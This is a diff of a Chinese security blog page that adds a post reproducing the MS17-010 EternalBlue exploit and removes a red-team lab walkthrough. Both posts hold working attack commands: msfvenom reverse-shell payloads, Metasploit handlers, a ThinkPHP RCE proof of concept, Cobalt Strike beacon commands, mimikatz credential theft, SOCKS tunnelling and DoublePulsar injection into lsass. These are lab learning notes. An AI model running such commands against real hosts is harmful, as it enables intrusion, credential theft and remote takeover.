@@ -255,6 +255,93 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/" class="post-title-link" itemprop="url">【漏洞复现】采用纯py3工具复现ms17010</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-02-17 20:25:17 / 修改时间：20:25:51" itemprop="dateCreated datePublished" datetime="2023-02-17T20:25:17+08:00">2023-02-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞复现】采用纯py3工具复现ms17010"><a href="#【漏洞复现】采用纯py3工具复现ms17010" class="headerlink" title="【漏洞复现】采用纯py3工具复现ms17010"></a>【漏洞复现】采用纯py3工具复现ms17010</h1><p>之前在实战中碰到了ms17010但是打不回来，遂找到了一款工具，记录一下。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境就要一个win7就可以，网上下。</p>
+<p>攻击机用kali，内网穿透用花生壳，工具的话用这个。</p>
+<p><a target="_blank" rel="noopener" href="https://www.t00ls.com/thread-39817-1-1.html">MS17-010纯python3利用程序（Eternalblue、优化代码） - 安全检测工具(Security Testing T00ls) - T00ls | 低调求发展 - 潜心习安全</a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开启环境之后，记得把win7的防火墙关了。</p>
+<p>首先用<code>use auxiliary/scanner/smb/smb_ms17_010 </code>模块扫到对面靶机存在漏洞。</p>
+<p><img src="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/image-20230217201845290.png" alt="image-20230217201845290"></p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=(你自己的穿透) LPORT=35932 -f raw &gt; shellcode</span><br></pre></td></tr></table></figure>
+
+<p>kali上进行监听，监听的时候用内网穿透内网的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set LHOST 192.168.32.108</span><br><span class="line">set LPORT 1234</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>来到利用工具的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python C:\工具\内网渗透\漏洞利用\ms17010\ms17-010.py --host 192.168.32.112 --file C:\ 工具\内网渗透\漏洞利用\ms17010\shellcode</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，自己的msf上已经有会话了。</p>
+<p>乱码问题用<code>chcp 65001</code>解决</p>
+<p><img src="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/image-20230217202416003.png" alt="image-20230217202416003"></p>
+<p><img src="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/image-20230217202425119.png" alt="image-20230217202425119"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/13/Evolucare-Ecsimaging-new-movie-php%E5%8F%8D%E5%B0%84%E6%80%A7xss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -429,204 +516,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/" class="post-title-link" itemprop="url">红日靶场5</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-02-11 23:46:44 / 修改时间：23:48:22" itemprop="dateCreated datePublished" datetime="2023-02-11T23:46:44+08:00">2023-02-11</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="红日靶场5"><a href="#红日靶场5" class="headerlink" title="红日靶场5"></a>红日靶场5</h1><p>好久没玩红日的靶场了，来过下瘾。</p>
-<p>还是先去他们官网下载下来，这次只有两个机器，简单拿下好吧</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">装好机器后，第一次登录会要求你更改密码</span><br><span class="line"></span><br><span class="line">2008dc  hongri2020@(因为聊天搞忘了，想了半天)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win7账号密码：</span><br><span class="line"></span><br><span class="line">sun\heart 123.com</span><br><span class="line"></span><br><span class="line">sun\Administrator dc123.com</span><br></pre></td></tr></table></figure>
-
-<p>喜欢我靶场吗🤗🤗</p>
-<p>下面是网卡环境，外网主机采用nat模式，内网网断采用lan网断模拟内网环境。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2008dc  192.168.138.138</span><br><span class="line"></span><br><span class="line">win7</span><br><span class="line">192.168.138.136</span><br><span class="line">192.168.32.107</span><br></pre></td></tr></table></figure>
-
-<p>这里其实有个坑，win7机器，自动设置了ip网段是135的，我们需要给他从网络属性中改成自动获取ip地址。这样nat模式就会和物理机处于同一个网断了。</p>
-<p>现在机器和网络环境搭建好之后，记得开启win7上面的phpstudy，傻瓜式一键开启。😋</p>
-<p>这里我放一下官方的红队思路啊，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">一、环境搭建</span><br><span class="line">1.环境搭建测试</span><br><span class="line">2.信息收集</span><br><span class="line">二、漏洞利用</span><br><span class="line">3.漏洞搜索与利用</span><br><span class="line">4.漏洞利用Getshell</span><br><span class="line">5.系统信息收集</span><br><span class="line">6.主机密码收集</span><br><span class="line">三、内网搜集</span><br><span class="line">7.内网--继续信息收集</span><br><span class="line">8.内网攻击姿势--MS14-058</span><br><span class="line">9.内网攻击姿势--MS17-010</span><br><span class="line">四、横向移动</span><br><span class="line">10.psexec远控</span><br><span class="line">11.内网其它主机端口</span><br><span class="line">12.netsh增删防火墙规则</span><br><span class="line">五、构建通道</span><br><span class="line">13.内网其它主机端口-代理转发</span><br><span class="line">六、持久控制</span><br><span class="line">14.域渗透-域成员信息收集</span><br><span class="line">15.域渗透-基础服务弱口令探测及深度利用之powershell</span><br><span class="line">16.域渗透-横向移动[wmi利用]</span><br><span class="line">17.域渗透-域控实现与利用</span><br><span class="line">七、痕迹清理</span><br><span class="line">18、日志清理</span><br></pre></td></tr></table></figure>
-
-<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>现在我们访问目标网址</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205135506911.png" alt="image-20230205135506911"></p>
-<p>thinkphp v5，我们去搜索一下历史漏洞即可</p>
-<p>下面是我找到的漏洞🥰</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/127134892">(148条消息) ThinkPHP V5（漏洞解析及利用）及tornado知识点_偶尔躲躲乌云334的博客-CSDN博客_thinkphp v5</a></p>
-<p>程序未对控制器进行过滤，导致攻击者可以用 \（斜杠）调用任意类方法。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.32.107/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
-
-<p>这是poc，复现成功，成功执行命令，那我们直接准备拿下web机器的权限。</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205135822480.png" alt="image-20230205135822480"></p>
-<p>这时候就是准备cs上线咯！</p>
-<p>用</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205140635063.png" alt="image-20230205140635063"></p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205141257606.png" alt="image-20230205141257606"></p>
-<p>选择powershell，成功上线。</p>
-<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>上线之后呢，首先要做的肯定就是一个信息手机啦</p>
-<p>我们这用巨龙拉登插件算了</p>
-<p>先看看目标主机的内外网ip地址</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205141908668.png" alt="image-20230205141908668"></p>
-<p>管理员权限（后面有个真是外网地址我就不放了，那是我物理机的地址，因为我们知道这个环境是两个内网网段搭建的，我们就默认为32这个网段是外网。）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内外网ip地址</span><br><span class="line">192.168.138.136（内网）</span><br><span class="line">192.168.32.107</span><br></pre></td></tr></table></figure>
-
-<p>现在我们知道了内网的网段，直接对这个网断的存活机器进行一个探测，当然用arp -a也可以试试</p>
-<p>可以看到</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205142223758.png" alt="image-20230205142223758"></p>
-<p>138网段，只有额外的138.138机器。我们下面在用工具探测一下。</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205142834986.png" alt="image-20230205142834986"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">load OnlinePC</span><br><span class="line">192.168.138.1/c is not a Valid CIDR</span><br><span class="line"></span><br><span class="line">C_Segment: 192.168.138.</span><br><span class="line">=============================================</span><br><span class="line">ICMP: 192.168.138.136	00-0C-29-CE-6E-01	win7.sun.com   	VMware</span><br><span class="line">ICMP: 192.168.138.138	00-0C-29-34-B5-08	               	VMware</span><br><span class="line"> MAC: 192.168.138.255	00-0C-29-CE-6E-01	               	VMware</span><br><span class="line">=============================================</span><br><span class="line">OnlinePC:3</span><br><span class="line">IP/24 Finished!</span><br><span class="line">End: 2023-02-05 14:29:07</span><br></pre></td></tr></table></figure>
-
-<p>成功扫到，还是这两台机器。</p>
-<p>那么就只有192.168.138.138需要我们去拿下。</p>
-<p>但还是弄一下基础的一些信息收集为好</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain controllers&quot; /domain  查看域控</span><br><span class="line">拒绝访问（你很好）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell hostname   查看主机名</span><br><span class="line">win7</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shell net config Workstation   查看当前登录域和用户信息</span><br><span class="line">计算机名                     \\WIN7</span><br><span class="line">计算机全名                   win7.sun.com</span><br><span class="line">用户名                       Administrator</span><br><span class="line"></span><br><span class="line">工作站正运行于               </span><br><span class="line">	NetBT_Tcpip_&#123;522E987F-D8BB-4F8D-BD80-6B57C75E348D&#125; (000C29CE6E01)</span><br><span class="line">	NetBT_Tcpip_&#123;4660F312-0A34-48C8-B979-938D6645032D&#125; (000C29CE6EF7)</span><br><span class="line"></span><br><span class="line">软件版本                     Windows 7 Professional</span><br><span class="line"></span><br><span class="line">工作站域                     SUN</span><br><span class="line">工作站域 DNS 名称            sun.com</span><br><span class="line">登录域                       SUN</span><br><span class="line"></span><br><span class="line">COM 打开超时 (秒)            0</span><br><span class="line">COM 发送计数 (字节)          16</span><br><span class="line">COM 发送超时 (毫秒)          250</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-
-<p>在一个名为SUN的域中。</p>
-<p>我记得直接ping dc或许会拿到域控</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell ping dc</span><br><span class="line">[*] Tasked beacon to run: ping dc</span><br><span class="line">[+] host called home, sent: 38 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">正在 Ping dc.sun.com [192.168.138.138] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure>
-
-<p>现在基本可以确定那台138的机器就是域控。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">当然也可以使用nslookup SUN.com</span><br><span class="line">来确认域控，结果如下</span><br><span class="line"></span><br><span class="line">beacon&gt; shell nslookup SUN.com</span><br><span class="line">[*] Tasked beacon to run: nslookup SUN.com</span><br><span class="line">[+] host called home, sent: 47 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  192.168.138.138（这个就是域控了）</span><br><span class="line"></span><br><span class="line">名称:    SUN.com</span><br><span class="line">Address:  192.168.138.138</span><br></pre></td></tr></table></figure>
-
-<p>然后用猕猴桃也可以抓到本机的明文密码</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205172052680.png" alt="image-20230205172052680"></p>
-<h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><p>现在信息收集完了，我们准备拿下域控。直接上内网大杀器，fscan上场!</p>
-<p>先用cs上传上去</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205160359591.png" alt="image-20230205160359591"></p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205160408104.png" alt="image-20230205160408104"></p>
-<p>上传上去之后，直接使用fscan开始</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\fscan64.exe -h 192.168.138.138</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205164407138.png" alt="image-20230205164407138"></p>
-<p>ms17-010，这不一把嗦?😋</p>
-<p>这边我们就用msf和cs联动一下吧，要拿ms17-010是要msf使用的。</p>
-<p>（以前我还没玩过联动呢）</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qi_SJQ_/article/details/122988526">(148条消息) 内网安全学习(八)—CS&amp;MSF联动_暮w光的博客-CSDN博客_cs和msf联动</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CS-&gt;MSF：</span><br><span class="line">创建Foreign监听器</span><br><span class="line">MSF监听模块设置对应端口地址</span><br><span class="line">CS执行Spawn选择监听器</span><br><span class="line"></span><br><span class="line">MSF-&gt;CS：</span><br><span class="line">CS创建监听器</span><br><span class="line">MSF载入新模块注入设置对应地址端口</span><br><span class="line">执行CS等待上线</span><br><span class="line">use exploit/windows/local/payload_inject</span><br></pre></td></tr></table></figure>
-
-<p>那我们就联动一下</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205174356762.png" alt="image-20230205174356762"></p>
-<p>这里填写kali的ip</p>
-<p>msf开启之后，协议和ip和端口都需要和cs一样才行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lport 4444</span><br><span class="line"></span><br><span class="line">set lhost 192.168.32.108</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205174829633.png" alt="image-20230205174829633"></p>
-<p>成功反弹到msf上面，现在就是设置一下路由，然后ms17010一把嗦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下面是msf的命令</span><br><span class="line"></span><br><span class="line">#获取当前主机下的网络架构分布</span><br><span class="line">run get_local_subnets</span><br><span class="line"></span><br><span class="line">添加路由访问</span><br><span class="line">run autoroute -s 192.168.138.0/24</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205185404763.png" alt="image-20230205185404763"></p>
-<p>随后在kali上执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nohup ./ew_for_linux64 -s rcsocks -l 8888 -e 6666</span><br><span class="line"></span><br><span class="line">#侦听6666端口，提供socks代理 并且将6666的代理发送到8888端口，此时也侦听8888端口，等待反弹连接</span><br><span class="line"></span><br><span class="line">通过cs把ew上传到win7上，win7连接kali</span><br><span class="line">shell C:\ew_for_win_32.exe -s rssocks -d 192.168.32.108 -e 6666</span><br></pre></td></tr></table></figure>
-
-<p>隧道搭建成功，然后我们就准备利用ms17010</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set  rhosts 192.168.138.138</span><br><span class="line">set  threads 3</span><br><span class="line">这里确实是成功检测到了漏洞的，也就是说明，我们的隧道确实是搭建成功了的。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set rhost 192.168.138.138</span><br><span class="line"></span><br><span class="line">set lhost 192.168.138.136 #设置为跳板机</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205191326846.png" alt="image-20230205191326846"></p>
-<p>但是报错了啊。我服了什么都能报错</p>
-<p>所以受不了了，我决定上todesk</p>
-<p>传上去之后，shell  C:\Users\leo\Desktop\123.exe</p>
-<p>然后C:\ProgramData\ToDesk_Lite路径下会有todesk的一个config文件</p>
-<p>将其下载下来，看着两个参数</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205194522338.png" alt="image-20230205194522338"></p>
-<p>把tempAuthPassEx的值复制出来，替换掉本机todesk配置文件中原来的tempAuthPassEx值</p>
-<p>重启todesk获取服务器的验证码</p>
-<p>很好，很好，很好，新版本没有这个功能了。很好，被修复了，非常好。我搞这个内网穿透要弄了一万年了。我真的谢谢，frp，ew，我都试过了。很好，很好。😅🤗</p>
-<h2 id="峰会路转之原生ms17010工具🥰"><a href="#峰会路转之原生ms17010工具🥰" class="headerlink" title="峰会路转之原生ms17010工具🥰"></a>峰会路转之原生ms17010工具🥰</h2><p>针对入口跳板机已经CS上线但是因为目标所在区域代理出来的流量卡慢、扫描会导致代理隧道崩溃、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=MSF&spm=1001.2101.3001.7020">MSF</a>的17010不成功但是原生利用工具成功的场景。此工具是由最原版调用fb.py那版提取出来的(原生版是最为稳定，并且能利用的版本)。</p>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/TolgaSEZER/EternalPulse">https://github.com/TolgaSEZER/EternalPulse</a></p>
-<p>下面进行使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.32.108 LPORT=4443 -f dll &gt; x64.dll</span><br></pre></td></tr></table></figure>
-
-<p>这里的lhost就填写kali本机就可以了</p>
-<p>将dll文件拷贝到EternalPulse工具目录下打包成zip，上传到cobaltstrike已控机器中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看目标主机是否安装解压缩软件。</span><br><span class="line">shell dir “C:\Program Files”</span><br><span class="line"></span><br><span class="line">解压缩工具包。</span><br><span class="line">shell “C:\Program Files\7-Zip\7z.exe” x EternalPulse.zip -oc:\EternalPulse</span><br><span class="line">或WinRAR:</span><br><span class="line">“C:\Program Files\WinRAR\rar.exe” x c:\test\EternalPulse.rar c:\test</span><br><span class="line"></span><br><span class="line">如果没有解压缩工具，给主机上传单个的rar.exe或7z.exe也可。</span><br></pre></td></tr></table></figure>
-
-<p>进入到解压缩后的工具目录。</p>
-<p>进不去直接执行命令也可以</p>
-<p><code>Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 存在17010漏洞的IP --TargetPort 445 --Target WIN72K8R2</code></p>
-<p>但是记得msf开启监听哦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.32.108</span><br><span class="line">set lport 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-
-<p>执行Doublepulsar-1.3.1.exe工具远程执行后门</p>
-<p><code>Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 存在17010漏洞的IP --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload x64.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</code></p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205224645712.png" alt="image-20230205224645712"></p>
-<p>成功报错，msf也没有收到session</p>
-<p>随后我找了下报错原因</p>
-<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/195218.html">解决win7嵌入式系统无法DoublePulsar问题 - SecPulse.COM | 安全脉搏</a></p>
-<p>成功解决问题，但是还是没有收到反弹shell。我要疯掉了，为什么到我这什么东西都疯狂报错啊？没有重装电脑前都好好的是吧。😊</p>
-<h2 id="获得明文密码直接"><a href="#获得明文密码直接" class="headerlink" title="获得明文密码直接"></a>获得明文密码直接</h2><p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230211234252037.png" alt="image-20230211234252037"></p>
